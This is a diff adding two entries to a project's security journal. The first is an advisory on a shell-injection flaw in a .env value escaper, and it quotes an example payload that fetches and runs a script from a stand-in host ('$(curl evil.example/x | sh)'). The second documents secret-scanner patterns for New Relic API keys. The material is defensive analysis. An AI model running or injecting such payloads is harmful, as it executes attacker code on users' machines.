@@ -1,3 +1,270 @@
+## 2026-05-10 - Shell-Metacharacter Injection in `_escape_env_value`: `.env` Sourced via `set -a; source .env` Executes `$(...)` / `` `...` `` From Operator-Supplied Values
+
+**Vulnerability:** `src/utils/configuration_wizard.py:_escape_env_value`
+generates the per-value double-quoted body of every `.env` document
+written by `scripts/configure_feed.py`. Pre-fix the escape chain
+covered only `\\`, `\r`, `\n`, and `"`:
+
+```python
+escaped = (
+    value.replace("\\", "\\\\")
+    .replace("\r", "\\r")
+    .replace("\n", "\\n")
+    .replace('"', '\\"')
+)
+return f'"{escaped}"'
+```
+
+`$` and `` ` `` were left bare inside the resulting double-quoted
+string. POSIX bash performs both `$VAR` / `${VAR}` parameter
+expansion AND `$(cmd)` / `` `cmd` `` command substitution inside
+double-quoted strings; the canonical idiom for loading a project's
+`.env` into the current shell is `set -a; source .env` (used in
+Make targets, dev-loop scripts, and developer documentation across
+the Python ecosystem). With the pre-fix escape chain, an
+operator-supplied value such as `--set EVIL='$(curl evil.example/x | sh)'`
+written to the wizard reaches the next `source .env` as
+`EVIL="$(curl evil.example/x | sh)"` — and bash executes the
+substitution under the sourcing user's UID.
+
+**Threat model:** the wizard is documented for interactive operator
+use, but its `--set KEY=VALUE` interface is also invoked from CI /
+Make targets / provisioning scripts, where the value can originate
+from other operator-facing inputs (existing `.env` re-roundtripped
+via `_load_existing` -> `_escape_env_value`, environment overrides
+from CI, `--set` arguments composed from shell-substituted
+variables). Three attack vectors:
+
+  1. **CI / provisioning script** — an automation pipeline that
+     templates `--set FEED_TITLE="$RAW_INPUT"` from any
+     untrusted-or-tampered source (a downstream config repository,
+     a rendered template, an env var loaded from a leaked secret
+     store) lets the attacker plant `$(...)` in the value. Once
+     the resulting `.env` is sourced by ANY shell consumer,
+     arbitrary commands run as the sourcing user.
+  2. **Roundtrip amplification** — `_load_existing` reads the
+     current `.env` via `load_env_file`, `_parse_value` decodes
+     the existing escape sequences (which pre-fix did not
+     normalise `$` / `` ` ``), and the wizard re-writes via
+     `_escape_env_value`. A `.env` that was previously edited
+     manually with literal `$something` in a comment-position
+     value would survive into the new file unchanged, preserving
+     the injection vector across every wizard run.
+  3. **Defense-in-depth** — even when the immediate operator is
+     trusted, `.env` files are routinely committed to private
+     repos, copied across hosts via `scp`, or shared with
+     contractors. Each downstream consumer that sources via
+     bash / zsh inherits the injection. The fix neutralises the
+     problem at the source rather than relying on every consumer
+     to load via the project's own Python parser.
+
+**Reproduced:** `tests/test_sentinel_env_value_shell_injection.py`
+contains 8 PoC tests:
+
+* 3 tests demonstrate the pre-fix injection vector (literal `$`,
+  `$(...)`, `` `...` `` survive into the `.env` body).
+* 3 tests verify roundtrip safety — values containing `$` /
+  `` ` `` re-parse byte-for-byte via the project's own
+  `_parse_value` (the inverse `\$` / `` \` `` decoding).
+* 2 regression tests pin existing escape behaviour (safe-character
+  fast-path passthrough; newline/quote escaping unchanged).
+
+End-to-end verification with bash:
+
+```bash
+$ KEY="\$EVIL_VAR"            # post-fix output of _escape_env_value
+$ echo "$KEY"
+$EVIL_VAR                       # bash sees the literal byte; no expansion
+$ KEY2="\$(echo executed)"
+$ echo "$KEY2"
+$(echo executed)                # bash sees the literal byte; no execution
+$ KEY3="\`echo executed\`"
+$ echo "$KEY3"
+`echo executed`                 # bash sees the literal byte; no execution
+```
+
+**Fix:** add `$` -> `\\$` and `` ` `` -> ``\\`\``  to the escape
+chain in `_escape_env_value`, and add the inverse `\$` / `` \` ``
+decoding to `_parse_value` so the project's own roundtrip stays
+byte-for-byte stable. The decode lookup is refactored into a
+`_DOUBLE_QUOTE_ESCAPES` dict + `_decode_escape` helper so
+`_parse_value` drops below the C901 complexity baseline (was 16,
+now ≤15 — fixed in the same change).
+
+**Learning:** every secret-shaped writer that targets a file
+format consumed by **multiple parsers with different escape
+semantics** must enumerate ALL parsers' escape sets, not just the
+home parser's. `.env` files are consumed by at least three
+parser families:
+
+  * **Python loaders** (`python-dotenv`, the project's own
+    `_parse_value`, `dotenv` ports) — usually treat `$` / `` ` ``
+    literally OR perform documented variable expansion only on
+    explicit opt-in.
+  * **POSIX shells** (`bash`/`zsh`/`sh`/`dash` via
+    `set -a; source .env`) — perform parameter expansion AND
+    command substitution unconditionally inside double quotes.
+  * **Containerisation tooling** (`docker run --env-file`,
+    `docker-compose env_file:`, `kubectl create secret
+    --from-env-file`) — strict KEY=VALUE parsers, generally don't
+    interpret quotes at all (everything after `=` is literal).
+
+The pre-fix shape was safe for parsers (1) and (3) but unsafe for
+parser (2). Documentation that recommends `set -a; source .env`
+for Python/shell-mixed dev loops makes parser (2) part of the
+implicit contract — the writer must produce output safe for the
+strictest consumer in the document's published consumption
+landscape.
+
+**Closing checklist (writer-side):** every wizard-style writer
+that emits a structured text format MUST:
+
+  1. Enumerate the document's published consumption parsers
+     (Python loader, POSIX shell, containerisation tool, IDE
+     env-injector, …).
+  2. Identify the union of escape-set requirements across all
+     parsers.
+  3. Implement the union, with paired roundtrip tests that prove
+     the home parser still decodes correctly.
+  4. Add a sentinel PoC test that bash (or the strictest
+     consumer) treats the produced output as literal data.
+
+The auto-discoverable closing grep for the env-document writer
+family:
+
+```bash
+grep -rn "format_env_document\|_escape_env_value" src/ scripts/
+```
+
+Both functions pass through `_escape_env_value` post-fix, so the
+single-point-of-audit principle holds.
+
+---
+
+## 2026-05-10 - Secret Scanner Drift Round 9: New Relic NRAK / NRRA / NRII — Round 8's Named-But-Deferred Observability Sub-Landscape
+
+**Vulnerability:** The 2026-05-10 Round 8 entry (PR for Render /
+Buildkite User Access Token / Fly.io) re-stated the prevention rule:
+
+> "Every audit round that adds a new issuer MUST also enumerate THREE
+> adjacent sub-landscapes the round did NOT cover."
+
+Round 8 enumerated **CI/CD platforms hosting tier continued**
+(closed Render), **CI/CD platforms execution tier continued**
+(closed Buildkite User Access Token) and **PaaS / edge runtime**
+(closed Fly.io), and explicitly named the **observability** sub-
+landscape as the next-round target with New Relic
+(`NRAK-<27 alphanumeric>` / `NRRA-<...>`) as the canonical-prefix
+candidate.
+
+Closing the three named-and-canonical-prefixed New Relic entries
+(NRAK User API Key, NRRA legacy REST API Key, NRII Insights Insert
+Key) re-establishes the issuer-attribution coverage the Round 8
+closing checklist guaranteed. Each token's canonical format
+silently bypasses specific attribution in `_KNOWN_TOKENS`:
+
+  1. **New Relic User API Key** (`NRAK-<27 uppercase alphanumeric>`)
+     — issued via one.newrelic.com > API Keys > Create key (User
+     key type) for full New Relic platform API access (NerdGraph
+     queries, account configuration, alert policy / notification
+     channel management, dashboard create/update/delete, user
+     management). Total length 32 chars (5-char `NRAK-` prefix +
+     27-char alphanumeric body). The `NRAK-` prefix is unambiguous
+     (no other major issuer uses it), and the strict alphanumeric
+     body lies entirely inside the entropy fallback's
+     `[A-Za-z0-9+/=_-]` alphabet — so the entropy regex matches
+     the full `NRAK-<body>` span as one generic finding, losing
+     the New-Relic-specific attribution. A leak grants the issuing
+     user's full New Relic API scope across every accessible
+     account: query every ingested metric / log / trace, modify
+     alert routing (suppressing real incidents during an attack),
+     exfiltrate dashboard contents (which often embed business
+     metric names that reveal product telemetry), and create new
+     API keys to maintain persistence. The revocation flow lives
+     at one.newrelic.com/api-keys.
+
+  2. **New Relic REST API Key** (`NRRA-<40 lowercase hex>`) — the
+     legacy REST API v2 credential format (deprecated in favour
+     of NRAK since 2021 but still issued and accepted for
+     backward compatibility). Total length 45 chars (5-char
+     `NRRA-` prefix + 40-char lowercase hex body). The `NRRA-`
+     prefix is unambiguous, and the strict hex body lies entirely
+     inside the entropy fallback's alphabet. A leak grants the
+     issuing account's REST API v2 scope: read application
+     performance data, browser monitoring data, mobile monitoring
+     data, and synthetic monitoring data. The legacy key format
+     has fewer scoping controls than NRAK, so leak surfaces are
+     typically wider. Distinct revocation flow at
+     one.newrelic.com/api-keys under the "REST API Keys" tab.
+
+  3. **New Relic Insights Insert Key** (`NRII-<32 lowercase hex>`)
+     — issued via one.newrelic.com > API Keys > Create key
+     (Insights Insert key type) for ingestion-only access to the
+     New Relic Events / Insights API. Total length 37 chars (5-
+     char `NRII-` prefix + 32-char lowercase hex body). The
+     `NRII-` prefix is unambiguous, and the strict hex body lies
+     entirely inside the entropy fallback's alphabet. A leak
+     grants the issuing account's event-ingestion scope: an
+     attacker can spam the account's event stream with
+     fabricated metrics, polluting dashboards, triggering false-
+     positive alerts (drowning out real ones during an attack),
+     and consuming the account's data ingestion quota. Distinct
+     revocation flow at one.newrelic.com/api-keys under the
+     "Insights Insert Keys" tab.
+
+**Threat model:** Each issuer's revocation flow lives at a distinct
+vendor URL (one.newrelic.com > API Keys), so a generic-only
+attribution slows IR (operator must inspect the full token body
+to recognise the New Relic shape, then discover which sub-portal
+to revoke at). The three patterns above are mutually exclusive at
+the prefix level (`NRAK-` / `NRRA-` / `NRII-` differ at the third
+character) and unambiguous against every other token in
+`_KNOWN_TOKENS`.
+
+**Reproduced:** `tests/test_sentinel_secret_scanner_drift_round9.py`
+contains 4 tests:
+
+* 3 PoC tests prove the specific issuer attribution for NRAK,
+  NRRA, NRII (pre-fix the entropy fallback flagged the body span
+  generically, losing the New-Relic-specific reason).
+* 1 boundary regression test confirms the new patterns don't
+  collide with substrings like German `Nr.` or short fragments
+  resembling `NRAK-` prefixes.
+
+**Fix:** add three `re.compile(...)` entries to `_KNOWN_TOKENS`
+in `src/utils/secret_scanner.py`, each with the issuer-specific
+reason text in German (`"New Relic User API Key gefunden"`,
+`"New Relic REST API Key gefunden"`,
+`"New Relic Insights Insert Key gefunden"`). The patterns use
+the unambiguous prefix + strict body shape (uppercase
+alphanumeric for NRAK, lowercase hex for NRRA / NRII) so they
+never collide with the generic entropy fallback OR with
+neighbouring `_KNOWN_TOKENS` entries.
+
+**Closing checklist:** Round 9 closes the three named-and-
+canonical-prefixed New Relic entries. The next round can pick up:
+
+* **Observability tier continued** — Datadog (`<32 hex>`-shape,
+  no prefix — bucket-(b)). Permanent bucket-(b) (no canonical
+  prefix; would require contextual key-name matching).
+* **Observability tier continued** — PagerDuty
+  (`<20 alphanumeric>`-shape, no prefix — bucket-(b)). Permanent
+  bucket-(b).
+* **Observability tier continued** — Honeycomb (`<32 hex>`-shape,
+  no prefix — bucket-(b)). Permanent bucket-(b).
+* **Customer engagement** — Twilio Sub-Account Auth Token
+  (`<32 hex>`-shape, no prefix — bucket-(b), partially covered
+  by Twilio Account SID `AC<32 hex>` but the auth-token half is
+  bucket-(b)).
+
+The entire observability sub-landscape's canonical-prefixed
+issuers (NRAK / NRRA / NRII) are now closed. Future rounds in
+this sub-landscape would need to address bucket-(b) detection
+(contextual key-name matching) rather than prefix-based pattern
+matching.
+
+---
+
 ## 2026-05-10 - Secret Scanner Drift Round 8: Render / Buildkite User Access Token / Fly.io — Round 7's Named-But-Deferred Hosting + Execution + PaaS Sub-Landscapes
 
 **Vulnerability:** The 2026-05-10 Round 7 entry (PR for Doppler /
